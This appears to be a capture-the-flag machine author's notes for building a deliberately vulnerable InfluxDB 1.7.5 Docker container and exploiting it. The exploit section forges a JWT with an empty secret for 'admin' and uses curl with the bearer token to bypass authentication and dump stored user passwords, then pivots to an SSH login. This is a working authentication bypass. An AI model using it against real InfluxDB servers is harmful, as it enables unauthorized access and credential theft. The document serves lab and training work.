# InfluxDB JWT Exploit
You can use a bug in InfluxDB <1.7.6, where you can craft a JWT token because of missing secret validation. This way you can bypass authentication and read *catherines* password.

## Setup steps for the vulnerable InfluxDB Docker Container
*Step 1*:
Create a folder on the Host system `/var/lib/influxdb`. This will be used for DB Persistence. `chmod 600` the folder!

Create the docker container like: `docker run -it -v /var/lib/influxdb:/var/lib/influxdb influxdb:1.7.5 /bin/bash`

*Step 2*:
You will be in a bash inside the container. Now you have to configure.
```bash
apt update
apt install vim
vim /etc/influxdb/influxdb.conf
```

Add this content to the file and save:

```bash
[http] 
enabled = true
bind-address = "0.0.0.0:8086"
auth-enabled = false
```

*Step 3*:
Create a admin user and bootstrap database like:
```bash
influxd &!
influx

[httpd] 127.0.0.1 - - [18/Jun/2021:12:25:45 +0000] "GET /ping HTTP/1.1" 204 0 "-" "InfluxDBShell/1.7.5" 4e0c21fe-d030-11eb-8001-0242ac110002 92
Connected to http://localhost:8086 version 1.7.5
InfluxDB shell version: 1.7.5
Enter an InfluxQL query
> 
```
Now enter all of those commands one by one:
```sql
CREATE USER admin WITH PASSWORD '1n$4N3lyH4rdP@ssw0rd!' WITH ALL PRIVILEGES;
CREATE DATABASE devzat;
CREATE RETENTION POLICY myretention ON devzat DURATION INF REPLICATION 1 DEFAULT;
USE devzat;
INSERT user enabled=false,password="WillyWonka2021",username="wilhelm"
INSERT user enabled=true,password="woBeeYareedahc7Oogeephies7Aiseci",username="catherine"
INSERT user enabled=true,password="RoyalQueenBee$",username="charles"
```
*Step 4*:
Activate Authentication:
```bash
root@30df7288ca61:/# ss -tlnp
State      Recv-Q Send-Q                                  Local Address:Port                                                 Peer Address:Port              
LISTEN     0      4096                                        127.0.0.1:8088                                                            *:*                   users:(("influxd",pid=434,fd=3))
LISTEN     0      4096                                               :::8086                                                           :::*                   users:(("influxd",pid=434,fd=22))

root@30df7288ca61:/# kill 434
root@30df7288ca61:/# 2021-06-18T12:32:32.739874Z	info	Signal received, initializing clean shutdown...	{"log_id": "0UomV86l000"}
2021-06-18T12:32:32.740028Z	info	Waiting for clean shutdown...	{"log_id": "0UomV86l000"}
2021-06-18T12:32:32.740295Z	info	Listener closed	{"log_id": "0UomV86l000", "service": "snapshot"}
2021-06-18T12:32:32.740262Z	info	Shutting down monitor service	{"log_id": "0UomV86l000", "service": "monitor"}
2021-06-18T12:32:32.740454Z	info	Terminating storage of statistics	{"log_id": "0UomV86l000", "service": "monitor"}
2021-06-18T12:32:32.740623Z	info	Terminating precreation service	{"log_id": "0UomV86l000", "service": "shard-precreation"}
2021-06-18T12:32:32.740700Z	info	Terminating continuous query service	{"log_id": "0UomV86l000", "service": "continuous_querier"}
2021-06-18T12:32:32.740862Z	info	Closing retention policy enforcement service	{"log_id": "0UomV86l000", "service": "retention"}
2021-06-18T12:32:32.743617Z	info	Closed service	{"log_id": "0UomV86l000", "service": "subscriber"}
2021-06-18T12:32:32.743749Z	info	Server shutdown completed	{"log_id": "0UomV86l000"}

[1]+  Done                    influxd
```

Now change `auth-enabled` to `true` in `/etc/influxdb/influxdb.conf` 
Then try the auth by starting the server with `influxd &!`.

```bash
root@30df7288ca61:/# curl -G "http://localhost:8086/query?pretty=true" --data-urlencode "db=devzat" --data-urlencode "q=SELECT * from /"user/"" --user admin:1n\$4N3lyH4rdP@ssw0rd\!
2021-06-18T12:34:07.735723Z	info	Executing query	{"log_id": "0UomcWYl000", "service": "query", "query": "SELECT * FROM devzat.myretention./user/"}
[httpd] 127.0.0.1 - admin [18/Jun/2021:12:34:07 +0000] "GET /query?db=devzat&pretty=true&q=SELECT+%2A+from+%2Fuser%2F HTTP/1.1" 200 1154 "-" "curl/7.52.1" 799ebc4c-d031-11eb-8003-0242ac110002 2539
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "user",
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "values": [
                        [
                            "2021-06-18T12:30:15.48099704Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-18T12:30:20.265246805Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-18T12:30:24.304898371Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ]
        }
    ]
}
```

*Step 5*:
Exit out of the container `exit` -> then commit the change:
```bash
root@30df7288ca61:/# exit
exit
> docker commit 30df7288ca61 influx-db:1.7.5
sha256:51abd0395e0bba73070ed3b7f412902bc80c9ad3e2967644e8ed822a85a10db8
```
*Step 6*:
You can now try your container with:
```bash
docker run --rm -d -v /var/lib/influxdb:/var/lib/influxdb --entrypoint ./entrypoint.sh -p 127.0.0.1:8086:8086 influx-db:1.7.5 influxd
```
This spawns a detached Docker Container which you now can curl to from within the VM (if you are patrick)

```bash
>  
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "user",
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "values": [
                        [
                            "2021-06-18T13:05:13.011432108Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-18T13:05:13.038202129Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-18T13:05:13.681673783Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ]
        }
    ]
}
```
## Exploit the container
Now if you are *patrick* on the machine you can curl the influxdb docker locally. This version **1.7.5** suffers from a vulnerability [https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMINFLUXDATAINFLUXDBSERVICESHTTPD-1041719](https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMINFLUXDATAINFLUXDBSERVICESHTTPD-1041719)
They do not check for the secret properly. So using a empty secret with the correct username `admin` will result in successful authentication.

All you need to do is forge a *JWT* Token:
[Documentation of InfluxDB for Format](https://docs.influxdata.com/influxdb/v1.7/administration/authentication_and_authorization/#authorization)

Timing is important. One can go to [https://www.unixtimestamp.com/index.php](https://www.unixtimestamp.com/index.php) and add 1 year to the current epoch time.

Then you use [jwt.io](https://jwt.io) like this:
![[jwt.png]]

Then you can bypass auth using curl:

```bash
> curl -G "http://localhost:8086/query?pretty=true" --data-urlencode "db=devzat" --data-urlencode "q=SELECT * from /"user/"" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjU1Njc5NjAwfQ.0ybNdcaURBIu6nwZsRHDLfkjOnwnMsMyLA7c6HABc-s"
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "user",
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "values": [
                        [
                            "2021-06-18T13:05:13.011432108Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-18T13:05:13.038202129Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-18T13:05:13.681673783Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ]
        }
    ]
}
```

Now you can `su catherine` and add in your ssh key to ssh into the machine as catherine.

# Configs
- `systemctl enable docker`
- Done the above setup
- Autostart:

```bash
as root on the system do crontab -e 

In the text editor write 

@reboot docker run --rm -d -v /var/lib/influxdb:/var/lib/influxdb --entrypoint ./entrypoint.sh -p 127.0.0.1:8086:8086 influx-db:1.7.5 influxd > /dev/null 2>&1

save and exit
```